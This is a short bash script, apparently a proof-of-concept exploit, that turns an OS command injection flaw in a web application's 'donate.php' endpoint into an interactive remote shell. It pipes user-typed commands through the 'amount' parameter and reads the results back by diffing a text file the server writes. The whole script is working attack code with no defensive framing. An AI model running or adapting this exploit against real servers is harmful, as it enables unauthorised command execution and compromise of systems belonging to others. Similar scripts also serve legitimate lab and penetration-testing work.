#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
  read -rp '$ ' raw_command
  command=$(printf %s "${raw_command}" | jq -sRr @uri)

  # Store the previous list of command outputs
  previous_response=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

  # Execute the OS Command Injection vulnerability
  curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
  
  # Store the new list of command outputs
  new_response=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
  
  # Extract only the difference between the two command outputs
  delta=$(diff <(echo "${previous_response}") <(echo "${new_response}"))

  # Output the command result
  echo "${delta}"

done
